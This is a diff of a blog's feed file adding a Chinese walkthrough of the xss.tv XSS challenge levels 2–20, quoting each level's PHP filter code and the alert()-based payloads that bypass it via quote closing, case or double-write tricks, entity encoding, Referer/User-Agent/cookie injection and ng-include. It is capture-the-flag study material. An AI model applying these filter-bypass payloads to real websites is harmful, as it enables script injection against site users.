+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310155118434.png" alt="image-20210310155118434"></p>
+<p>这时候我们点击input框就能弹窗</p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310165004936.png" alt="image-20210310165004936"></p>
+<p>和level 2 一样尝试下闭合value的值，无果，估计不是双引号闭合的方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onclick&#x3D;alert(&#39;xss&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310161042357.png" alt="image-20210310161042357"></p>
+<p>但是发现把我输入的内容从<code>&#39;</code>处截断了，估计是<code>&#39;</code>闭合方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;onclick&#x3D;alert(&#39;xss&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310161224943.png" alt="image-20210310161224943"></p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310165218833.png" alt="image-20210310165218833"></p>
+<p>怎么又换回来<code>&quot;</code>号了？？原来是level 2 没有对<code>&lt;&gt;</code>进行过滤，这里对其进行了过滤，可是我们的payload无需<code>&lt;&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onclick&#x3D;alert(&#39;xss&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310165616532.png" alt="image-20210310165616532"></p>
+<p>这里在on中间加入了<code>_</code>来阻止我们触发事件，查看下源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先对keyword变量使用了<code>strtolower()</code>函数转换，把所有字符转换为小写；接着过滤了<code>&lt;script&gt;</code>，并替换为<code>&lt;scr_ipt&gt;</code>；过滤了<code>on</code>并替换为<code>o_n</code>。因为<code>on</code>是很多事件都包含的关键词，所以这里无法直接通过闭合引号在<code>&lt;input&gt;</code>标签中来触发弹窗了，这个可以闭合双引号和标签，然后通过<code>javascript:alert(&#39;XSS&#39;)</code>这种形式来触发弹窗。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascript:alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310170119900.png" alt="image-20210310170119900"></p>
+<p>可以看到在input框的后面多了个链接，点击就能触发XSS。</p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310170353410.png" alt="image-20210310170353410"></p>
+<p>这里把<code>herf</code>也过滤了，这样就无法使用<code>javascript:alert()</code>这种方法来弹窗，查看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以发现这里少了level 5的<code>strtolower()</code>，因此可以使用大小写绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; Onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;a Href&#x3D;javascript:alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310170850324.png" alt="image-20210310170850324"></p>
+<p>这里把我们的<code>onclick</code>事件的<code>on</code>给过滤了，尝试双写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; oonnclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p>回头看看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =strtolower( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>果然是把关键词都替换为空格，一般这种情况都能直接双写绕过。</p>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310171220610.png" alt="image-20210310171220610"></p>
+<p>这里是将你输入的内容变成一个<code>&lt;a&gt;</code>标签的href，尝试使用JavaScript伪协议，发现被类似level 6的加<code>_</code>的方式过滤了，看看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的过滤规则在level 7的基础上把<code>strtolower()</code>也加上了，而且在input框里面还使用了<code>htmlspecialchars()</code>对HTML标签进行转义，所以这里肯定是无法利用的。再看<code>&lt;a&gt;</code>标签的里面的href是直接输出，而且没有过滤，直接输出在了双引号<code>&quot;</code>之间，当作字符串处理，利用当作字符串处理的特点，可以直接将我们的payload HTML使用HTML实体字符编码绕过。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javas&amp;#x63;ript:alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310172413293.png" alt="image-20210310172413293"></p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310172611741.png" alt="image-20210310172611741"></p>
+<p>看上去和 level 8 差不多，但是尝试使用JavaScript伪协议好像被检测出来说链接不合法，那就先看看源码他是怎么检测的吧：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===strpos(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>原来是在 level 8 的基础上对我们输入的内容查看是否有<code>http://</code>这串字符，有的才输出，否则就说不合法，那好办，直接在payload后面加就行了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javas&amp;#x63;ript:alert(&#39;XSS&#39;) &#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310173121499.png" alt="image-20210310173121499"></p>
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310173329445.png" alt="image-20210310173329445"></p>
+<p>页面上没有能输入的地方，但是在前端页面隐藏了3个输入框，每个都尝试下能不能注入，发现<code>t_sort</code>可以传入参数</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310173551650.png" alt="image-20210310173551650"></p>
+<p>那么我们就可以利用这里构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.ctf8.com&#x2F;level10.php?t_sort&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310175636000.png" alt="image-20210310175636000"></p>
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310180040882.png" alt="image-20210310180040882"></p>
+<p>发现这里多了个<code>t_ref</code>的<code>input</code>标签，而且原来的<code>t_sort</code>似乎被转义了，无法利用，先看看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于<code>$str</code>和<code>$str00</code>都使用了<code>htmlspecialchars()</code>函数对其进行转义，因此这里都无法进行利用。再看<code>$str11</code>，它是从<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>取值，然后直接作为<code>t_ref</code>的值，很明显，我们可以直接构造 <strong>Rfeferer</strong>的值进行XSS攻击。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310180834271.png" alt="image-20210310180834271"></p>
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310181006919.png" alt="image-20210310181006919"></p>
+<p>这一题和 level 11 本质上换汤不换药，从Referer换成了User-Agent即可，这里有个问题就是似乎成功注入之后会直接跳转到别的页面。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310181737224.png" alt="image-20210310181737224"></p>
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310181903581.png" alt="image-20210310181903581"></p>
+<p>和前面两题一样，这次换成从cookie注入了，先抓包，发现<code>t_cook</code>的值是cookie里面的user</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310182122965.png" alt="image-20210310182122965"></p>
+<p>那就直接构造cookie的user为我们的payload即可。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310182233505.png" alt="image-20210310182233505"></p>
+<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>网页好像加载出问题了</p>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a class="link"   href="http://www.runoob.com/angularjs/ng-ng-include.html" >AngularJS ng-include 指令<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level14.php?src&#x3D;&quot;level1.php?name&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(&#39;XSS&#39;)&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310203353006.png" alt="image-20210310203353006"></p>
+<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310203631723.png" alt="image-20210310203631723"></p>
+<p>只有这一个输出点，看看源码对传入的参数做了什么限制</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;    &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p>
+<p>可以使用如下符号替代空格</p>
+<table>
+<thead>
+<tr>
+<th align="left">符号</th>
+<th align="left">URL编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">回车(CR)</td>
+<td align="left">%0d</td>
+</tr>
+<tr>
+<td align="left">换行(LF)</td>
+<td align="left">%0a</td>
+</tr>
+<tr>
+<td align="left">空格</td>
+<td align="left">%0c</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?keyword&#x3D;&lt;img%0Asrc&#x3D;&quot;xss&quot;%0Aonerror&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310204737849.png" alt="image-20210310204737849"></p>
+<p>URL传进去的参数会再<code>&lt;embed&gt;</code>里显示，以个是在<code>=</code>前面，一个是在<code>=</code>后面，那我们是不是可以前一个作为事件名字，后一个作为事件执行的操作呢？</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D;onmouseover&amp;arg02&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310205415002.png" alt="image-20210310205415002"></p>
+<p>似乎多了个<code>&quot;</code>，吧<code>&quot;</code>去掉换成空格，即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D; onmouseover&amp;arg02&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>没发现和level 17 有啥区别，上题的payload也依然能用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D; onmouseover&amp;arg02&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>现在的浏览器都不支持flash了，再学这个似乎也没意义，给了自己一个理由偷懒（主要是网上都没找到答案）</p>
+<h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>同上</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://blog.csdn.net/qq_43221499/article/details/91355234" >学习笔记五：xss.tv通关笔记<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.lhaihai.top/post/xsstv%E6%8C%91%E6%88%98%E8%B5%9B/" >XSSTV挑战赛<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.sqlsec.com/2020/01/xss.html" >XSS从零开始<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
   </entry>
   <entry>
     <title>CSS基础</title>
@@ -1361,7 +1503,7 @@
 </blockquote>
 <ul>
 <li>文本框  text</li>
-<li>下拉框  <select></li>
+<li>下拉框 <code> &lt;select&gt;</code></li>
 <li>单选框   radio</li>
 <li>多选框  checkbox</li>
 <li>隐藏域  hidden</li>
@@ -1436,316 +1578,6 @@
       </categories>
       <tags>
         <tag>JavaScript</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQLI-LABS (Adv Injections) 21-37关</title>
-    <url>/2021/03/07/SQLI-LABS%20(Adv%20Injections)%2021-37%E5%85%B3/</url>
-    <content><![CDATA[<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><ul>
-<li>查看源码</li>
-</ul>
